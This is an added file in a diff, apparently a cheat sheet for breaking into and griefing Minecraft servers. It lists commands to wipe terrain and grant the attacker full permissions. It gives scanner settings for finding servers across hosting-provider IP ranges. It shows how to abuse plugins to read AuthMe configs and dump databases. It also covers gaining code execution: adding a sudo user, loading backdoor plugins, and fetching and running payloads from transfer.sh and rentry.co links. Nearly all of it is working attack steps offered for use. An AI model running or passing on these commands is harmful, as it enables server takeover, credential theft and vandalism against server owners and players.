@@ -1,0 +1,70 @@
+2 - Griefing commands :
+
+  - /fill ~15 ~15 ~15 ~-15 ~-15 ~-15 air
+  - //sphere 0 30
+  - /sp area 5
+  - /broadcast &c&lHacked By &6https://www.youtube.com/@Maxthonx.
+  - /discordsrv bcast Server Hacked - https://www.youtube.com/@Maxthonx @everyone
+  - /lp user Maxthonx p set *
+  - /pex user Maxthonx add *
+  - /manuaddp Maxthonx *
+  - /minecraft:op Maxthonx
+
+3 - Bypass Methods :
+
+  - /server {tab}
+  - /send {tab}
+  - /hub
+  - /lobby
+  - /opguard op Maxthonx
+
+4 - Found many servers :
+  
+  - You need to download QuboScanner : https://github.com/replydev/Quboscanner
+  - if you have a big VPS scan that range : java -Dfile.encoding=UTF-8 -jar qubo.jar -ports 10000-10010,20000-20010,30000-30010,40000-40010,22222,11111,33333,44444,55555,65535,25500-25599,25600-25699 -th 6000 -ti 1250 -c 1 -noping -range {range} / java -Dfile.encoding=UTF-8 -jar qubo.jar -ports 25500-25600 -th 6000 -ti 1250 -c 1 -noping -range {range}
+  - and if you don't have a big VPS scan this range java -Dfile.encoding=UTF-8 -jar qubo.jar -ports 25500-25599 -th 2000 -ti 600 -c 1 -noping -range {range}
+  - for a bot : java -Dfile.encoding=UTF-8 -jar  qubo.jar -ports 1-60020 -th 500 -ti 1500 -c 1 -noping -range {range}
+  - for found OVH range : https://ipinfo.io/AS16276
+  - for found Hetzner range : https://ipinfo.io/AS24940
+5 - For dump the database :
+  - If ProtocolLib / LuckPerms / WorldGuard : for check if the server is container or multicraft
+    - ProtocolLib : /protocol dump
+    - LuckPerms : /lp export .
+    - WorldGuard : /wg report
+  
+  - If HolographicDisplays is in a version = or less than 2.3.9
+    - 1st /hd create aaa
+    - 2nd /hd readtext aaa ../AuthMe/config.yml
+
+  - If LiteBans is in a version = or less than 2.3
+    - 1st /litebans sqlexec SELECT * FROM litebans_history;
+    - 2nd go on your lastest.log in your .minecraft and copy the database
+
+  - If in PlaceholderApi you have Javascript
+    - 1st /papi list and if Javascript
+    - 2nd /jsexp parse me new java.lang.ProcessBuilder("useradd","-u","1337","-G","sudo","-d","/home/lol","-p","pasu1pLKLje2M","lol").start();
+
+  - If PluginManager is on the server
+    - 1st /pluginmanager
+    - 2nd /pm download spigot 102876 System | /pm download direct {backdoor link}
+
+  - If Plugman is on the server
+    - 1st /plugman
+    - 2nd /plugman download spigot 102876 | /plugman download direct {backdoor link}
+
+  - If CoreProtect is on the server
+    - 1st /coreprotect
+    - 2nd /coreprotect lookup u:<user> a:command
+    
+  - If Skript 1.0.2 is on the server
+    - 1st /skript info
+    - 2nd /skript exec passwd 12344
+PlaceholderAPI CommandPanels:
+/cpi lmfao.jar https://transfer.sh/get/S3MLec/unnamed.jar
+/papi register ../../CommandPanels/panels/lmfao.jar.yml
+/papi parse me %rce_curl_-O_https://rentry.co/os7q7/raw%
+/papi parse me %rce_bash_raw%
+Replace https://rentry.co/os7q7/raw with your own payload link.
+Plugman CommandPanels:
+/cpi lmfao.jar https://transfer.sh/get/zCONva/SpigotRCE-1.0-SNAPSHOT-shaded.jar
+/plugman load CommandPanels/panels/lmfao.jar.yml
